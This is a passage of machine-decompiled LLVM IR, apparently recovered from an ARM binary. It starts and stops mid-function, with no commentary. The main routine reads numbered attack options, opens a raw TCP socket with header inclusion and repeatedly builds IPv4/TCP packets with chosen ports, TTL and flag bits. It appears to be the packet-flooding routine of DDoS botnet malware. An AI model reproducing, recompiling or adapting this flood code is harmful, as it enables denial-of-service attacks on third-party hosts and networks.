  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 43, 44, 45, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63, 64, 65, 66, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 32, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 21, 20, 22, 24, 23, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 20, 12, 13, 14, 15, 16, 17, 18, 19, 24, 21, 22, 23, 25, 27, 26, 29, 28, 31, 30, 38, 39, 37, 41, 40, 42, 43, 44, 46, 45, 47, 51, 48, 49, 50, 52, 54, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 768, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_d60c, { 1, 0 }
  uselistorder label %dec_label_pc_d4dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d464, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %.thread9, { 2, 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_d1f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d130, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_d0c4, { 1, 0 }
}

define i32 @function_d618(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d618:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_d618 = load i32, i32* @r4, align 4
  %v1_d61c = urem i32 %arg1, 256
  store i32 %v1_d61c, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d634 = urem i32 %arg3, 256
  store i32 %v1_d634, i32* @r4, align 4
  %v2_d638 = call i32 @_calloc(i32 %v1_d61c, i32 4)
  %v0_d63c = load i32, i32* @r5, align 4
  store i32 %v0_d63c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d64c = load i32, i32* @r4, align 4
  %v5_d650 = inttoptr i32 %v0_d63c to i32*
  %v6_d650 = call i32 @function_b240(i32 %v0_d64c, i32* %v5_d650, i32 2, i32 0)
  %v1_d65c = urem i32 %v6_d650, 256
  store i32 %v1_d65c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d668 = load i32, i32* @r5, align 4
  store i32 %v0_d668, i32* %r1.global-to-local, align 4
  %v0_d66c = load i32, i32* @r4, align 4
  %v5_d670 = trunc i32 %v6_d650 to i8
  %v6_d674 = inttoptr i32 %v0_d668 to i32*
  %v7_d674 = call i32 @function_b240(i32 %v0_d66c, i32* %v6_d674, i32 3, i32 65535)
  %v0_d678 = load i32, i32* @r5, align 4
  store i32 %v0_d678, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d674, i32* @r8, align 4
  %v0_d688 = load i32, i32* @r4, align 4
  %v4_d68c = inttoptr i32 %v0_d678 to i32*
  %v5_d68c = call i32 @function_b240(i32 %v0_d688, i32* %v4_d68c, i32 4, i32 64)
  %v1_d694 = urem i32 %v5_d68c, 256
  store i32 %v1_d694, i32* %ip.global-to-local, align 4
  %v0_d698 = load i32, i32* @r5, align 4
  store i32 %v0_d698, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d6a4 = load i32, i32* @r4, align 4
  %v6_d6ac = inttoptr i32 %v0_d698 to i32*
  %v7_d6ac = call i32 @function_b240(i32 %v0_d6a4, i32* %v6_d6ac, i32 5, i32 0)
  %v1_d6b8 = urem i32 %v7_d6ac, 256
  store i32 %v1_d6b8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d6c4 = load i32, i32* @r5, align 4
  store i32 %v0_d6c4, i32* %r1.global-to-local, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  %v5_d6d0 = inttoptr i32 %v0_d6c4 to i32*
  %v6_d6d0 = call i32 @function_b240(i32 %v0_d6c8, i32* %v5_d6d0, i32 6, i32 65535)
  %v0_d6d8 = load i32, i32* @r5, align 4
  store i32 %v0_d6d8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d6d0, i32* @r7, align 4
  %v0_d6e8 = load i32, i32* @r4, align 4
  %v4_d6ec = inttoptr i32 %v0_d6d8 to i32*
  %v5_d6ec = call i32 @function_b240(i32 %v0_d6e8, i32* %v4_d6ec, i32 7, i32 65535)
  %v0_d6f4 = load i32, i32* @r5, align 4
  store i32 %v0_d6f4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_d6ec, i32* @r6, align 4
  %v0_d704 = load i32, i32* @r4, align 4
  %v4_d708 = inttoptr i32 %v0_d6f4 to i32*
  %v5_d708 = call i32 @function_b240(i32 %v0_d704, i32* %v4_d708, i32 17, i32 65535)
  %v0_d714 = load i32, i32* @r5, align 4
  store i32 %v0_d714, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_d720 = load i32, i32* @r4, align 4
  %v5_d724 = inttoptr i32 %v0_d714 to i32*
  %v6_d724 = call i32 @function_b240(i32 %v0_d720, i32* %v5_d724, i32 18, i32 65535)
  %v0_d728 = load i32, i32* @r5, align 4
  store i32 %v0_d728, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d738 = load i32, i32* @r4, align 4
  %v5_d73c = inttoptr i32 %v0_d728 to i32*
  %v6_d73c = call i32 @function_b240(i32 %v0_d738, i32* %v5_d73c, i32 11, i32 0)
  %v0_d740 = load i32, i32* @r5, align 4
  store i32 %v0_d740, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d750 = load i32, i32* @r4, align 4
  %v5_d754 = inttoptr i32 %v0_d740 to i32*
  %v6_d754 = call i32 @function_b240(i32 %v0_d750, i32* %v5_d754, i32 12, i32 1)
  %v0_d758 = load i32, i32* @r5, align 4
  store i32 %v0_d758, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d768 = load i32, i32* @r4, align 4
  %v5_d76c = inttoptr i32 %v0_d758 to i32*
  %v6_d76c = call i32 @function_b240(i32 %v0_d768, i32* %v5_d76c, i32 13, i32 0)
  %v0_d770 = load i32, i32* @r5, align 4
  store i32 %v0_d770, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d780 = load i32, i32* @r4, align 4
  %v5_d784 = inttoptr i32 %v0_d770 to i32*
  %v6_d784 = call i32 @function_b240(i32 %v0_d780, i32* %v5_d784, i32 14, i32 0)
  %v0_d788 = load i32, i32* @r5, align 4
  store i32 %v0_d788, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d798 = load i32, i32* @r4, align 4
  %v5_d79c = inttoptr i32 %v0_d788 to i32*
  %v6_d79c = call i32 @function_b240(i32 %v0_d798, i32* %v5_d79c, i32 15, i32 0)
  %v0_d7a0 = load i32, i32* @r5, align 4
  store i32 %v0_d7a0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7b0 = load i32, i32* @r4, align 4
  %v5_d7b4 = inttoptr i32 %v0_d7a0 to i32*
  %v6_d7b4 = call i32 @function_b240(i32 %v0_d7b0, i32* %v5_d7b4, i32 16, i32 0)
  %v0_d7b8 = load i32, i32* @r5, align 4
  store i32 %v0_d7b8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_d7c8 = load i32, i32* @r4, align 4
  %v5_d7cc = inttoptr i32 %v0_d7b8 to i32*
  %v6_d7cc = call i32 @function_b240(i32 %v0_d7c8, i32* %v5_d7cc, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r5, align 4
  store i32 %v0_d7dc, i32* %r1.global-to-local, align 4
  %v0_d7e0 = load i32, i32* @r4, align 4
  %v4_d7e4 = inttoptr i32 %v0_d7dc to i32*
  %v5_d7e4 = call i32 @function_b240(i32 %v0_d7e0, i32* %v4_d7e4, i32 1, i32 1)
  %v2_d7f0 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_d7f0, i32* %r3.global-to-local, align 4
  %v1_d7f4 = urem i32 %v5_d7e4, 256
  store i32 %v1_d7f4, i32* %ip.global-to-local, align 4
  %v0_d7f8 = load i32, i32* @r5, align 4
  store i32 %v0_d7f8, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d800 = load i32, i32* @r4, align 4
  %v5_d808 = inttoptr i32 %v0_d7f8 to i32*
  %v6_d808 = call i32 @function_b1d4(i32 %v0_d800, i32* %v5_d808, i32 25, i32 %v2_d7f0, i32 %v1_d7f4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_d81c = call i32 @_socket(i32 2, i32 3, i32 6)
  %v7_d820 = icmp eq i32 %v3_d81c, -1
  store i1 %v7_d820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d820, label %dec_label_pc_dc58, label %dec_label_pc_d82c

dec_label_pc_d82c:                                ; preds = %dec_label_pc_d618
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d834 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d834, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d848 = call i32 @_setsockopt(i32 %v3_d81c, i32 0, i32 3, i32 %v6_d834, i32 4)
  %v7_d84c = icmp eq i32 %v5_d848, -1
  store i1 %v7_d84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d84c, label %dec_label_pc_dc50, label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_d82c
  %v0_d854 = load i32, i32* @r8, align 4
  %v0_d858 = load i32, i32* @r7, align 4
  %v0_d85c = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d864 = urem i32 %v0_d854, 65536
  store i32 %v3_d864, i32* %r2.global-to-local, align 4
  %v3_d868 = urem i32 %v0_d858, 65536
  store i32 %v3_d868, i32* %r3.global-to-local, align 4
  %v3_d86c = urem i32 %v0_d85c, 65536
  store i32 %v3_d86c, i32* %ip.global-to-local, align 4
  %v0_d870 = load i32, i32* @fp, align 4
  %v2_d870 = icmp eq i32 %v0_d870, 0
  store i1 %v2_d870, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp75 = icmp slt i32 %v0_d870, 1
  br i1 %tmp75, label %dec_label_pc_dd70, label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d854
  %v1_d890 = add i32 %v6_d7cc, 40
  %tmp76 = mul i32 %v1_d890, 256
  %v1_d8a4 = urem i32 %v0_d858, 256
  %v1_d8a8 = and i32 %tmp76, 65280
  %v3_d8ac = mul nuw nsw i32 %v1_d8a4, 256
  %v1_d8b4 = urem i32 %v0_d85c, 256
  %tmp77 = udiv i32 %v0_d85c, 256
  %v3_d8b8 = urem i32 %tmp77, 256
  %tmp78 = udiv i32 %v1_d890, 256
  %tmp79 = udiv i32 %v0_d858, 256
  %v4_d8c0 = urem i32 %tmp79, 256
  %v5_d8c0 = or i32 %v4_d8c0, %v3_d8ac
  store i32 %v5_d8c0, i32* @sl, align 4
  %v4_d8c4 = mul nuw nsw i32 %v1_d8b4, 256
  %v5_d8c4 = or i32 %v4_d8c4, %v3_d8b8
  store i32 %v5_d8c4, i32* @r6, align 4
  %tmp80 = udiv i32 %v0_d854, 256
  %v3_d8d4 = urem i32 %tmp80, 256
  %v1_d8d8 = urem i32 %v0_d854, 256
  %tmp81 = mul i32 %v5_d708, 256
  %v1_d8e0 = and i32 %tmp81, 65280
  %v1_d8e4 = urem i32 %v6_d73c, 2
  %v1_d8e8 = urem i32 %v6_d754, 2
  %v1_d8ec = urem i32 %v6_d76c, 2
  %tmp82 = udiv i32 %v5_d708, 256
  %v4_d8f0 = urem i32 %tmp82, 256
  %v5_d8f0 = or i32 %v4_d8f0, %v1_d8e0
  store i32 %v5_d8f0, i32* @r8, align 4
  %v1_d910 = urem i32 %v6_d784, 2
  %v1_d914 = urem i32 %v6_d79c, 2
  %v1_d918 = urem i32 %v6_d7b4, 2
  %v1_d91c = urem i32 %v6_d76c, 256
  %v4_d920 = mul nuw nsw i32 %v1_d8d8, 256
  %v5_d920 = or i32 %v4_d920, %v3_d8d4
  store i32 %v5_d920, i32* @r5, align 4
  %v3_d93425 = udiv i32 %v1_d8a8, 256
  store i32 %v3_d93425, i32* %r3.global-to-local, align 4
  store i32 %v1_d8d8, i32* %ip.global-to-local, align 4
  store i32 %v1_d8a4, i32* %r1.global-to-local, align 4
  store i32 %v1_d8b4, i32* %r2.global-to-local, align 4
  %v5_d950 = trunc i32 %v0_d858 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext8 = mul i32 %v5_d68c, 16777216
  %v4_d9ac = sdiv i32 %sext8, 16777216
  %sext9 = mul i32 %v0_d854, 16777216
  %v4_d9b8 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp78, 16777216
  %v4_d9cc = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %v1_d890, 16777216
  %v4_d9d0 = sdiv i32 %sext11, 16777216
  %tmp = sub nsw i32 0, %v1_d8e4
  %v4_da20 = and i32 %tmp, 32
  %tmp93 = sub nsw i32 0, %v1_d8e8
  %v4_da34 = and i32 %tmp93, 16
  %tmp94 = sub nsw i32 0, %v1_d8ec
  %v4_da48 = and i32 %tmp94, 8
  %tmp95 = sub nsw i32 0, %v1_d910
  %v4_da5c = and i32 %tmp95, 4
  %tmp96 = sub nsw i32 0, %v1_d914
  %v3_da70 = and i32 %tmp96, 2
  %sext12 = mul i32 %v0_d85c, 16777216
  %v7_daa0 = sdiv i32 %sext12, 16777216
  %v1_d9b4 = trunc i32 %v4_d9ac to i8
  %extract.t = trunc i32 %v4_d9b8 to i8
  %v3_daa0 = sext i8 %v5_d950 to i32
  %v2_dac4 = icmp eq i32 %v1_d91c, 0
  br label %dec_label_pc_d95c

dec_label_pc_d95c:                                ; preds = %bb89, %dec_label_pc_d888
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d968 = call i32 @_calloc(i32 1510, i32 1)
  store i32 %v2_d638, i32* %ip.global-to-local, align 4
  %v2_d974 = load i32, i32* %r4.global-to-local, align 4
  %v5_d974 = mul i32 %v2_d974, 4
  %v6_d974 = add i32 %v5_d974, %v2_d638
  %v7_d974 = inttoptr i32 %v6_d974 to i32*
  store i32 %v2_d968, i32* %v7_d974, align 4
  %v3_d978 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d978, i32* %r3.global-to-local, align 4
  %v0_d97c = load i32, i32* %ip.global-to-local, align 4
  %v4_d97c = mul i32 %v3_d978, 4
  %v5_d97c = add i32 %v0_d97c, %v4_d97c
  %v6_d97c = inttoptr i32 %v5_d97c to i32*
  %v7_d97c = load i32, i32* %v6_d97c, align 4
  store i32 %v7_d97c, i32* @r7, align 4
  %v1_d980 = inttoptr i32 %v7_d97c to i8*
  %v2_d980 = load i8, i8* %v1_d980, align 1
  %tmp97 = urem i8 %v2_d980, 16
  %v1_d984 = zext i8 %tmp97 to i32
  %v1_d988 = or i32 %v1_d984, 64
  store i32 %v1_d988, i32* %r2.global-to-local, align 4
  %v1_d98c = trunc i32 %v1_d988 to i8
  store i8 %v1_d98c, i8* %v1_d980, align 1
  %v0_d990 = load i32, i32* @r7, align 4
  %v1_d990 = inttoptr i32 %v0_d990 to i8*
  %v2_d990 = load i8, i8* %v1_d990, align 1
  %v1_d994 = and i8 %v2_d990, -16
  %v1_d998 = or i8 %v1_d994, 5
  store i32 %v1_d6b8, i32* %r1.global-to-local, align 4
  store i8 %v1_d998, i8* %v1_d990, align 1
  %v2_d9a8 = load i32, i32* @r7, align 4
  %v3_d9a8 = add i32 %v2_d9a8, 1
  %v4_d9a8 = inttoptr i32 %v3_d9a8 to i8*
  store i8 %v5_d670, i8* %v4_d9a8, align 1
  store i32 %v4_d9ac, i32* %r3.global-to-local, align 4
  %v0_d9b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_d9b0 = icmp eq i32 %v0_d9b0, 0
  store i1 %v2_d9b0, i1* %cpsr_z.global-to-local, align 1
  %v2_d9b4 = load i32, i32* @r7, align 4
  %v3_d9b4 = add i32 %v2_d9b4, 8
  %v4_d9b4 = inttoptr i32 %v3_d9b4 to i8*
  store i8 %v1_d9b4, i8* %v4_d9b4, align 1
  store i32 %v4_d9b8, i32* %r2.global-to-local, align 4
  %v0_d9bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d95c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d9c0 = load i32, i32* @r7, align 4
  %v4_d9c0 = add i32 %v3_d9c0, 6
  %v5_d9c0 = inttoptr i32 %v4_d9c0 to i8*
  store i8 64, i8* %v5_d9c0, align 1
  %v0_d9c8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t26 = trunc i32 %v0_d9c8.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d95c, %bb
  %v0_d9c8.off0 = phi i8 [ %extract.t, %dec_label_pc_d95c ], [ %extract.t26, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_d9c8 = load i32, i32* @r7, align 4
  %v3_d9c8 = add i32 %v2_d9c8, 5
  %v4_d9c8 = inttoptr i32 %v3_d9c8 to i8*
  store i8 %v0_d9c8.off0, i8* %v4_d9c8, align 1
  store i32 %v4_d9cc, i32* %ip.global-to-local, align 4
  store i32 %v4_d9d0, i32* %r1.global-to-local, align 4
  %v0_d9d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9d4, label %bb84, label %bb83

bb83:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread, %bb83
  %v0_d9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d9d8 = trunc i32 %v0_d9d8 to i8
  %v2_d9d8 = load i32, i32* @r7, align 4
  %v3_d9d8 = add i32 %v2_d9d8, 9
  %v4_d9d8 = inttoptr i32 %v3_d9d8 to i8*
  store i8 %v1_d9d8, i8* %v4_d9d8, align 1
  %v0_d9dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9dc, label %bb86, label %bb85

bb85:                                             ; preds = %bb84
  %v1_d9dc = load i32, i32* %r2.global-to-local, align 4
  %v2_d9dc = trunc i32 %v1_d9dc to i8
  %v3_d9dc = load i32, i32* @r7, align 4
  %v4_d9dc = add i32 %v3_d9dc, 7
  %v5_d9dc = inttoptr i32 %v4_d9dc to i8*
  store i8 %v2_d9dc, i8* %v5_d9dc, align 1
  br label %bb86

bb86:                                             ; preds = %bb84, %bb85
  %v3_d9e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9e0, i32* %r2.global-to-local, align 4
  %v0_d9e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_d9e4 = trunc i32 %v0_d9e4 to i8
  %v2_d9e4 = load i32, i32* @r7, align 4
  %v3_d9e4 = add i32 %v2_d9e4, 2
  %v4_d9e4 = inttoptr i32 %v3_d9e4 to i8*
  store i8 %v1_d9e4, i8* %v4_d9e4, align 1
  store i32 %v6_d808, i32* %ip.global-to-local, align 4
  %v0_d9ec = load i32, i32* %r2.global-to-local, align 4
  %v3_d9ec = mul i32 %v0_d9ec, 32
  store i32 %v3_d9ec, i32* %r3.global-to-local, align 4
  %v1_d9f0 = load i32, i32* @r7, align 4
  %v2_d9f0 = add i32 %v1_d9f0, 12
  %v3_d9f0 = inttoptr i32 %v2_d9f0 to i32*
  store i32 %v6_d808, i32* %v3_d9f0, align 4
  %v0_d9f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d9f4 = load i32, i32* %r2.global-to-local, align 4
  %tmp98 = mul i32 %v1_d9f4, -8
  %v5_d9f4 = add i32 %v0_d9f4, %tmp98
  %v1_d9f8 = load i32, i32* @sb, align 4
  %v2_d9f8 = add i32 %v1_d9f8, %v5_d9f4
  store i32 %v2_d9f8, i32* %r3.global-to-local, align 4
  %v1_d9fc = add i32 %v2_d9f8, 16
  %v2_d9fc = inttoptr i32 %v1_d9fc to i32*
  %v3_d9fc = load i32, i32* %v2_d9fc, align 4
  store i32 %v3_d9fc, i32* %r2.global-to-local, align 4
  %v0_da00 = load i32, i32* %r1.global-to-local, align 4
  %v1_da00 = trunc i32 %v0_da00 to i8
  %v2_da00 = load i32, i32* @r7, align 4
  %v3_da00 = add i32 %v2_da00, 3
  %v4_da00 = inttoptr i32 %v3_da00 to i8*
  store i8 %v1_da00, i8* %v4_da00, align 1
  %v0_da04 = load i32, i32* @r5, align 4
  %v1_da04 = trunc i32 %v0_da04 to i8
  %v2_da04 = load i32, i32* @r7, align 4
  %v3_da04 = add i32 %v2_da04, 4
  %v4_da04 = inttoptr i32 %v3_da04 to i8*
  store i8 %v1_da04, i8* %v4_da04, align 1
  %v0_da08 = load i32, i32* %r2.global-to-local, align 4
  %v1_da08 = load i32, i32* @r7, align 4
  %v2_da08 = add i32 %v1_da08, 16
  %v3_da08 = inttoptr i32 %v2_da08 to i32*
  store i32 %v0_da08, i32* %v3_da08, align 4
  %v0_da0c = load i32, i32* @sl, align 4
  %v1_da0c = trunc i32 %v0_da0c to i8
  %v2_da0c = load i32, i32* @r7, align 4
  %v3_da0c = add i32 %v2_da0c, 20
  %v4_da0c = inttoptr i32 %v3_da0c to i8*
  store i8 %v1_da0c, i8* %v4_da0c, align 1
  %v0_da10 = load i32, i32* @r7, align 4
  %v1_da10 = add i32 %v0_da10, 20
  store i32 %v1_da10, i32* @r4, align 4
  %v1_da14 = add i32 %v0_da10, 33
  %v2_da14 = inttoptr i32 %v1_da14 to i8*
  %v3_da14 = load i8, i8* %v2_da14, align 1
  %v4_da14 = zext i8 %v3_da14 to i32
  store i32 %v1_d8e4, i32* %r1.global-to-local, align 4
  %v1_da1c = and i32 %v4_da14, 223
  %v5_da20 = or i32 %v1_da1c, %v4_da20
  store i32 %v5_da20, i32* %r3.global-to-local, align 4
  %v1_da24 = trunc i32 %v5_da20 to i8
  store i8 %v1_da24, i8* %v2_da14, align 1
  %v0_da28 = load i32, i32* @r4, align 4
  %v1_da28 = add i32 %v0_da28, 13
  %v2_da28 = inttoptr i32 %v1_da28 to i8*
  %v3_da28 = load i8, i8* %v2_da28, align 1
  %v4_da28 = zext i8 %v3_da28 to i32
  store i32 %v1_d8e8, i32* %r3.global-to-local, align 4
  %v1_da30 = and i32 %v4_da28, 239
  %v5_da34 = or i32 %v1_da30, %v4_da34
  store i32 %v5_da34, i32* %r2.global-to-local, align 4
  %v1_da38 = trunc i32 %v5_da34 to i8
  store i8 %v1_da38, i8* %v2_da28, align 1
  %v0_da3c = load i32, i32* @r4, align 4
  %v1_da3c = add i32 %v0_da3c, 13
  %v2_da3c = inttoptr i32 %v1_da3c to i8*
  %v3_da3c = load i8, i8* %v2_da3c, align 1
  %v4_da3c = zext i8 %v3_da3c to i32
  store i32 %v1_d8ec, i32* %ip.global-to-local, align 4
  %v1_da44 = and i32 %v4_da3c, 247
  %v5_da48 = or i32 %v1_da44, %v4_da48
  store i32 %v5_da48, i32* %r3.global-to-local, align 4
  %v1_da4c = trunc i32 %v5_da48 to i8
  store i8 %v1_da4c, i8* %v2_da3c, align 1
  %v0_da50 = load i32, i32* @r4, align 4
  %v1_da50 = add i32 %v0_da50, 13
  %v2_da50 = inttoptr i32 %v1_da50 to i8*
  %v3_da50 = load i8, i8* %v2_da50, align 1
  %v4_da50 = zext i8 %v3_da50 to i32
  store i32 %v1_d910, i32* %r1.global-to-local, align 4
  %v1_da58 = and i32 %v4_da50, 251
  %v5_da5c = or i32 %v1_da58, %v4_da5c
  store i32 %v5_da5c, i32* %r2.global-to-local, align 4
  %v1_da60 = trunc i32 %v5_da5c to i8
  store i8 %v1_da60, i8* %v2_da50, align 1
  %v0_da64 = load i32, i32* @r4, align 4
  %v1_da64 = add i32 %v0_da64, 13
  %v2_da64 = inttoptr i32 %v1_da64 to i8*
  %v3_da64 = load i8, i8* %v2_da64, align 1
  %v4_da64 = zext i8 %v3_da64 to i32
  store i32 %v1_d914, i32* %r2.global-to-local, align 4
  %v1_da6c = and i32 %v4_da64, 253
  %v4_da70 = or i32 %v1_da6c, %v3_da70
  store i32 %v4_da70, i32* %r3.global-to-local, align 4
  %v1_da74 = trunc i32 %v4_da70 to i8
  store i8 %v1_da74, i8* %v2_da64, align 1
  %v0_da78 = load i32, i32* @r4, align 4
  %v1_da78 = add i32 %v0_da78, 12
  %v2_da78 = inttoptr i32 %v1_da78 to i8*
  %v3_da78 = load i8, i8* %v2_da78, align 1
  %v4_da78 = zext i8 %v3_da78 to i32
  store i32 %v4_da78, i32* %r2.global-to-local, align 4
  %v1_da7c = add i32 %v0_da78, 13
  %v2_da7c = inttoptr i32 %v1_da7c to i8*
  %v3_da7c = load i8, i8* %v2_da7c, align 1
  %v4_da7c = zext i8 %v3_da7c to i32
  store i32 %v1_d918, i32* %ip.global-to-local, align 4
  %tmp99 = urem i8 %v3_da78, 16
  %v1_da84 = zext i8 %tmp99 to i32
  %v1_da88 = and i32 %v4_da7c, 254
  %v2_da8c = or i32 %v1_da88, %v1_d918
  store i32 %v2_da8c, i32* %r3.global-to-local, align 4
  %v1_da90 = or i32 %v1_da84, 80
  store i32 %v1_da90, i32* %r2.global-to-local, align 4
  %v1_da94 = trunc i32 %v2_da8c to i8
  store i8 %v1_da94, i8* %v2_da7c, align 1
  %v0_da98 = load i32, i32* %r2.global-to-local, align 4
  %v1_da98 = trunc i32 %v0_da98 to i8
  %v2_da98 = load i32, i32* @r4, align 4
  %v3_da98 = add i32 %v2_da98, 12
  %v4_da98 = inttoptr i32 %v3_da98 to i8*
  store i8 %v1_da98, i8* %v4_da98, align 1
  store i32 %v3_daa0, i32* %r1.global-to-local, align 4
  store i32 %v7_daa0, i32* %r2.global-to-local, align 4
  %v2_daa4 = load i32, i32* @r4, align 4
  %v3_daa4 = add i32 %v2_daa4, 1
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 %v5_d950, i8* %v4_daa4, align 1
  %v0_daa8 = load i32, i32* %r2.global-to-local, align 4
  %v1_daa8 = trunc i32 %v0_daa8 to i8
  %v2_daa8 = load i32, i32* @r4, align 4
  %v3_daa8 = add i32 %v2_daa8, 3
  %v4_daa8 = inttoptr i32 %v3_daa8 to i8*
  store i8 %v1_daa8, i8* %v4_daa8, align 1
  %v0_daac = load i32, i32* @r6, align 4
